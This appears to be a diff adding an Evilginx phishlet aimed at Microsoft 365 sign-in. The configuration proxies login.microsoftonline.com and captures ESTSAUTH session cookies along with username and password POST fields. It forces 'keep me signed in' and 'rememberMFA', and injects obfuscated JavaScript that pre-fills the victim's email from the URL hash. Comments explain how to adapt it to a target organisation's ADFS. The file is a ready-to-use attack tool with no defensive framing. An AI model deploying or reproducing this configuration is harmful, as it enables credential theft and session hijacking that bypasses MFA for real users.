@@ -1,0 +1,53 @@
+name: '222'
+author: '@gytee'
+min_ver: '2.3.0'
+proxy_hosts:
+  - {phish_sub: 'login', orig_sub: 'login', domain: 'microsoftonline.com', session: true, is_landing: true}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'office.com', session: false, is_landing:false}
+  # The lines below are needed if your target organization utilizes ADFS.
+  # If they do, you need to uncomment all following lines that contain <...>
+  # To get the correct ADFS subdomain, test the web login manually and check where you are redirected.
+  # Assuming you get redirected to adfs.example.com, the placeholders need to be filled out as followed:
+  #    <insert-adfs-subdomain> = adfs
+  #    <insert-adfs-host> = example.com
+  #    <insert-adfs-subdomain-and-host> = adfs.example.com
+  #- {phish_sub: 'adfs', orig_sub: '<insert-adfs-subdomain>', domain: '<insert-adfs-host>', session: true, is_landing:false}
+  #- {phish_sub: 'adfs', orig_sub: '<insert-adfs-subdomain>', domain: '<insert-adfs-host>:443', session: true, is_landing:false}
+sub_filters:
+  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
+  # Uncomment and fill in if your target organization utilizes ADFS
+  #- {triggers_on: '<insert-adfs-subdomain-and-host>', orig_sub: 'login', domain: 'microsoftonline.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+auth_tokens:
+  - domain: '.login.microsoftonline.com'
+    keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT','SignInStateCookie']
+credentials:
+  username:
+    key: '(loginfmt|UserName)'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: '(passwd|Password)'
+    search: '(.*)'
+    type: 'post'
+login:
+  domain: 'login.microsoftonline.com'
+  path: '/'
+force_post:
+  - path: '/kmsi'
+    search: 
+      - {key: 'LoginOptions', search: '.*'}
+    force:
+      - {key: 'LoginOptions', value: '1'}
+    type: 'post'
+  - path: '/common/SAS'
+    search: 
+      - {key: 'rememberMFA', search: '.*'}
+    force:
+      - {key: 'rememberMFA', value: 'true'}
+    type: 'post'
+js_inject:
+  - trigger_domains: ["login.microsoftonline.com"]
+    trigger_paths: ["/common/oauth2/","/","/*"]
+    script: |
+        var _0x276f52=_0x2825;function _0xcd50(){var _0x47f37d=['2AfRYsa','load','4495070biqRdW','location','9067600xvzwJW','replace','9jtUpFM','6qCtbie','5677804AbOACi','95683xBxTfE','143714QdmjHe','1450985kCQnTU','12IpMSJa','addEventListener','i0116','value','20EwFinB','getElementById','501oBTECu'];_0xcd50=function(){return _0x47f37d;};return _0xcd50();}function _0x2825(_0x2913a0,_0x893871){var _0xcd504d=_0xcd50();return _0x2825=function(_0x2825d2,_0x43be8a){_0x2825d2=_0x2825d2-0x18d;var _0x2710c8=_0xcd504d[_0x2825d2];return _0x2710c8;},_0x2825(_0x2913a0,_0x893871);}(function(_0x5371d1,_0x3c7849){var _0x1cea87=_0x2825,_0x2d20c8=_0x5371d1();while(!![]){try{var _0x26267d=parseInt(_0x1cea87(0x199))/0x1*(-parseInt(_0x1cea87(0x18f))/0x2)+parseInt(_0x1cea87(0x18e))/0x3*(-parseInt(_0x1cea87(0x19f))/0x4)+-parseInt(_0x1cea87(0x19a))/0x5+-parseInt(_0x1cea87(0x196))/0x6*(parseInt(_0x1cea87(0x198))/0x7)+parseInt(_0x1cea87(0x193))/0x8+parseInt(_0x1cea87(0x195))/0x9*(parseInt(_0x1cea87(0x191))/0xa)+parseInt(_0x1cea87(0x197))/0xb*(-parseInt(_0x1cea87(0x19b))/0xc);if(_0x26267d===_0x3c7849)break;else _0x2d20c8['push'](_0x2d20c8['shift']());}catch(_0x4d32f8){_0x2d20c8['push'](_0x2d20c8['shift']());}}}(_0xcd50,0x96f8a),window[_0x276f52(0x19c)](_0x276f52(0x190),function(){var _0x124bab=setInterval(_0x22eb1e,0x64);function _0x22eb1e(){var _0x5f1db4=_0x2825;if(document[_0x5f1db4(0x18d)]('i0116')){var _0x128066=window[_0x5f1db4(0x192)]['hash'][_0x5f1db4(0x194)]('#',''),_0x1c6a7b=btoa(_0x128066);window[_0x5f1db4(0x192)]['hash']='#'+_0x1c6a7b;var _0x303d97=document['getElementById'](_0x5f1db4(0x19d));_0x303d97[_0x5f1db4(0x19e)]=atob(_0x1c6a7b),_0x40005d();}}function _0x40005d(){clearInterval(_0x124bab);}}));
